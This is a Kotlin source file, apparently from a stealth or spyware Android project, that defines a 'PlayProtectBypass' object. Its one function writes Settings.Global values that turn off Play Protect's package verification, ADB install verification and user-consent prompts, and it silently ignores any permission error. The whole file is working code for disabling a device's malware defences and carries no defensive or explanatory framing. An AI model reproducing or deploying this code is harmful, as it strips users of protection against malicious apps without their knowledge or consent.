package com.sp.stealth

import android.content.Context
import android.provider.Settings

object PlayProtectBypass {
    fun disableViaDeviceOwner(ctx: Context) {
        try {
            Settings.Global.putInt(ctx.contentResolver, "package_verifier_enable", 0)
            Settings.Global.putInt(ctx.contentResolver, "verifier_verify_adb_installs", 0)
            Settings.Global.putInt(ctx.contentResolver, "package_verifier_user_consent", -1)
        } catch (_: SecurityException) {}
    }
}